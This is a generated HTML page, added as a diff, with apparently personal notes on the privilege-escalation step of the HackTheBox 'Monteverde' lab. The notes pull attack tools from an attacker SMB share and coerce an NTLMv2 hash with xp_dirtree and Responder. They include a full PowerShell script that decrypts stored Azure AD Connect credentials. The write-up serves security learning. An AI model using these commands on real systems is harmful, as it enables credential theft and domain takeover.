@@ -1,0 +1,824 @@
+<!doctype html>
+<html
+  lang="en-us"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en-us">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title> &middot; My New Hugo Site</title>
+    <meta name="title" content=" &middot; My New Hugo Site">
+
+  
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/red-team-ctfs/htb-labs/3.-active-directory/3.-azure-admins/monteverde/3.-privesc/privesc/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.0ad212daab98ca5051eea8a0d3412430bd53f90dba7b667f9e7598fb545043ad6052a79d2142ecda91752bc9d24f68d9178c523bafdbf2cd1b465443389bbf58.css"
+    integrity="sha512-CtIS2quYylBR7qig00EkML1T&#43;Q26e2Z/nnWY&#43;1RQQ61gUqedIULs2pF1K8nST2jZF4xSO6/b8s0bRlRDOJu/WA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.90867e4ceecde25580f418994053fd0749d446fd0e8f0028782793ec6434fb0945ecbfe21e6a8b2f788760c0ecc3663aacb155e42e4e73d79ebaebadecd201d2.js"
+      integrity="sha512-kIZ&#43;TO7N4lWA9BiZQFP9B0nURv0OjwAoeCeT7GQ0&#43;wlF7L/iHmqLL3iHYMDsw2Y6rLFV5C5Oc9eeuuut7NIB0g=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/red-team-ctfs/htb-labs/3.-active-directory/3.-azure-admins/monteverde/3.-privesc/privesc/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="My New Hugo Site">
+  <meta property="og:description" content="![[Pasted image 20250703165949.png]]
+netstat -ano | findstr TCP Imported PowerUpSQL.ps1
+copy \\10.10.14.119\share\PowerUpSQL.ps1 . . .\PowerUpSQL.ps1 Invoke-SQLAudit -v it found this vulnerability, we could maybe get a NTLMV2 hash ![[Pasted image 20250703170540.png]]
+sudo responder -I tun0 sqlcmd -Q &#34;xp_dirtree &#39;\\10.10.14.119\share\test&#39;&#34; got a ntlmv2 hash
+![[Pasted image 20250703170920.png]]
+but it was not Crackable.
+On my machine:
+impacket-smbserver share $(pwd) -smb -smb2support copying files
+Set-ExecutionPolicy Bypass -Scope process -Force copy \\10.10.14.119\share\SharpHound.exe . copy \\10.10.14.119\share\winPEASany.exe . copy \\10.10.14.119\share\powerviewmaster.ps1 . tried manual enumeration and Winpeas but did not find anything interesting so went on bloodhound">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="red-team-ctfs">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="My New Hugo Site">
+  <meta name="twitter:description" content="![[Pasted image 20250703165949.png]]
+netstat -ano | findstr TCP Imported PowerUpSQL.ps1
+copy \\10.10.14.119\share\PowerUpSQL.ps1 . . .\PowerUpSQL.ps1 Invoke-SQLAudit -v it found this vulnerability, we could maybe get a NTLMV2 hash ![[Pasted image 20250703170540.png]]
+sudo responder -I tun0 sqlcmd -Q &#34;xp_dirtree &#39;\\10.10.14.119\share\test&#39;&#34; got a ntlmv2 hash
+![[Pasted image 20250703170920.png]]
+but it was not Crackable.
+On my machine:
+impacket-smbserver share $(pwd) -smb -smb2support copying files
+Set-ExecutionPolicy Bypass -Scope process -Force copy \\10.10.14.119\share\SharpHound.exe . copy \\10.10.14.119\share\winPEASany.exe . copy \\10.10.14.119\share\powerviewmaster.ps1 . tried manual enumeration and Winpeas but did not find anything interesting so went on bloodhound">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Red Team CTFs",
+    "name": "",
+    "headline": "",
+    
+    "abstract": "\u003cp\u003e![[Pasted image 20250703165949.png]]\u003c\/p\u003e\n\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003enetstat -ano | findstr TCP\n\u003c\/code\u003e\u003c\/pre\u003e\u003cp\u003eImported \u003ccode\u003ePowerUpSQL.ps1\u003c\/code\u003e\u003c\/p\u003e\n\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003ecopy \\\\10.10.14.119\\share\\PowerUpSQL.ps1 .  \n\u003c\/code\u003e\u003c\/pre\u003e\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003e. .\\PowerUpSQL.ps1\n\u003c\/code\u003e\u003c\/pre\u003e\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003eInvoke-SQLAudit -v \n\u003c\/code\u003e\u003c\/pre\u003e\u003cp\u003eit found this vulnerability, we could maybe get a NTLMV2 hash\n![[Pasted image 20250703170540.png]]\u003c\/p\u003e\n\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003esudo responder -I tun0 \n\u003c\/code\u003e\u003c\/pre\u003e\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003esqlcmd -Q \u0026#34;xp_dirtree \u0026#39;\\\\10.10.14.119\\share\\test\u0026#39;\u0026#34;\n\u003c\/code\u003e\u003c\/pre\u003e\u003cp\u003egot a ntlmv2 hash\u003c\/p\u003e\n\u003cp\u003e![[Pasted image 20250703170920.png]]\u003c\/p\u003e\n\u003cp\u003ebut it was not Crackable.\u003c\/p\u003e\n\u003cp\u003eOn my machine:\u003c\/p\u003e\n\u003cdiv class=\u0022highlight\u0022\u003e\u003cpre tabindex=\u00220\u0022 style=\u0022color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\u0022\u003e\u003ccode class=\u0022language-SML\u0022 data-lang=\u0022SML\u0022\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003eimpacket-smbserver share  $(pwd) -smb -smb2support\n\u003c\/span\u003e\u003c\/span\u003e\u003c\/code\u003e\u003c\/pre\u003e\u003c\/div\u003e\u003cp\u003ecopying files\u003c\/p\u003e\n\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003eSet-ExecutionPolicy Bypass -Scope process -Force\n\u003c\/code\u003e\u003c\/pre\u003e\u003cpre tabindex=\u00220\u0022\u003e\u003ccode\u003ecopy \\\\10.10.14.119\\share\\SharpHound.exe .\ncopy \\\\10.10.14.119\\share\\winPEASany.exe .\ncopy \\\\10.10.14.119\\share\\powerviewmaster.ps1 .\n\u003c\/code\u003e\u003c\/pre\u003e\u003cp\u003etried manual enumeration and Winpeas but did not find anything interesting so went on bloodhound\u003c\/p\u003e",
+    "inLanguage": "en-us",
+    "url" : "http:\/\/localhost:1313\/red-team-ctfs\/htb-labs\/3.-active-directory\/3.-azure-admins\/monteverde\/3.-privesc\/privesc\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    
+    
+    
+    
+    
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "400"
+  }]
+  </script>
+
+
+
+  
+  
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          My New Hugo Site
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+
+    
+
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="0001-01-01T00:00:00&#43;00:00">January 1, 1</time><span class="px-2 text-primary-500">&middot;</span><span>400 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>![[Pasted image 20250703165949.png]]</p>
+<pre tabindex="0"><code>netstat -ano | findstr TCP
+</code></pre><p>Imported <code>PowerUpSQL.ps1</code></p>
+<pre tabindex="0"><code>copy \\10.10.14.119\share\PowerUpSQL.ps1 .  
+</code></pre><pre tabindex="0"><code>. .\PowerUpSQL.ps1
+</code></pre><pre tabindex="0"><code>Invoke-SQLAudit -v 
+</code></pre><p>it found this vulnerability, we could maybe get a NTLMV2 hash
+![[Pasted image 20250703170540.png]]</p>
+<pre tabindex="0"><code>sudo responder -I tun0 
+</code></pre><pre tabindex="0"><code>sqlcmd -Q &#34;xp_dirtree &#39;\\10.10.14.119\share\test&#39;&#34;
+</code></pre><p>got a ntlmv2 hash</p>
+<p>![[Pasted image 20250703170920.png]]</p>
+<p>but it was not Crackable.</p>
+<p>On my machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SML" data-lang="SML"><span style="display:flex;"><span>impacket-smbserver share  $(pwd) -smb -smb2support
+</span></span></code></pre></div><p>copying files</p>
+<pre tabindex="0"><code>Set-ExecutionPolicy Bypass -Scope process -Force
+</code></pre><pre tabindex="0"><code>copy \\10.10.14.119\share\SharpHound.exe .
+copy \\10.10.14.119\share\winPEASany.exe .
+copy \\10.10.14.119\share\powerviewmaster.ps1 .
+</code></pre><p>tried manual enumeration and Winpeas but did not find anything interesting so went on bloodhound</p>
+<p>Using the ingestor and downloading the data</p>
+<pre tabindex="0"><code>.\SharpHound.exe -c All 
+</code></pre><pre tabindex="0"><code>download 20250703080744_BloodHound.zip
+</code></pre><p>starting bloodhound-ce via docker</p>
+<pre tabindex="0"><code>docker-compose up
+</code></pre><hr>
+<p>Mhope</p>
+<p>![[Pasted image 20250703161256.png]]</p>
+<p>group of that user</p>
+<p>![[Pasted image 20250703161324.png]]</p>
+<p>The Azure Admins group is suspicious so I had made some researches and found this post:</p>
+<p><a
+  href="https://blog.xpnsec.com/azuread-connect-for-redteam/"
+    target="_blank"
+  >https://blog.xpnsec.com/azuread-connect-for-redteam/</a></p>
+<p>we can display the config like this:</p>
+<pre tabindex="0"><code>sqlcmd -Q &#34;Use ADSync; select private_configuration_xml FROM mms_management_agent&#34;
+</code></pre><p>![[Pasted image 20250703172943.png]]</p>
+<p>and if we display the encrypted configuration we obtain a password</p>
+<pre tabindex="0"><code>sqlcmd -Q &#34;Use ADSync; select private_configuration_xml,encrypted_configuration FROM mms_management_agent&#34;
+</code></pre><p>![[Pasted image 20250703173120.png]]</p>
+<p>we cannot decrypt it with <code>bash64 -d</code> and need to do it</p>
+<pre tabindex="0"><code>touch azuredecrypter.ps1
+</code></pre><p>and we just export the script given</p>
+<p>![[Pasted image 20250703173359.png]]</p>
+<p>copying the file over evil-winrm</p>
+<pre tabindex="0"><code>copy \\10.10.14.119\share\azuredecrypter.ps1 
+</code></pre><p>There was an issue with the connexion string so I looked and found this version from 0xdf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$client.Open()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$key_id = $reader.GetInt32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$instance_id = $reader.GetGuid(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$entropy = $reader.GetGuid(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$reader.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$config = $reader.GetString(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$crypted = $reader.GetString(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$reader.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add-type -path <span style="color:#e6db74">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$km.LoadKeySet($entropy, $instance_id, $key_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$key = $null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$km.GetActiveCredentialKey([<span style="color:#66d9ef">ref</span>]$key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$key2 = $null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$km.GetKey(<span style="color:#ae81ff">1</span>, [<span style="color:#66d9ef">ref</span>]$key2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$decrypted = $null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$key2.DecryptBase64ToString($crypted, [<span style="color:#66d9ef">ref</span>]$decrypted)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$domain = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Domain: &#34;</span> + $domain.Domain)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Username: &#34;</span> + $username.Username)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Password: &#34;</span> + $password.Password)
+</span></span></code></pre></div><p>re imported it and ran it</p>
+<pre tabindex="0"><code>.\azuredecrypter.ps1
+</code></pre><p>and got the credentials for admin</p>
+<p>![[Pasted image 20250703174334.png]]</p>
+<p>and got root</p>
+<p>![[Pasted image 20250703174439.png]]</p>
+<p>![[Pasted image 20250703174505.png]]</p>
+
+          
+          
+          
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_Red Team CTFs\HTB LABS\3. Active Directory\3. Azure Admins\Monteverde\3. Privesc\Privesc.md"
+          data-oid-likes="likes_Red Team CTFs\HTB LABS\3. Active Directory\3. Azure Admins\Monteverde\3. Privesc\Privesc.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/red-team-ctfs/htb-labs/3.-active-directory/3.-azure-admins/monteverde/loot/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  ></span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="0001-01-01T00:00:00&#43;00:00">January 1, 1</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/red-team-ctfs/htb-labs/3.-active-directory/3.-azure-admins/monteverde/2.-exploitation/2.-exploitation/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  ></span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="0001-01-01T00:00:00&#43;00:00">January 1, 1</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
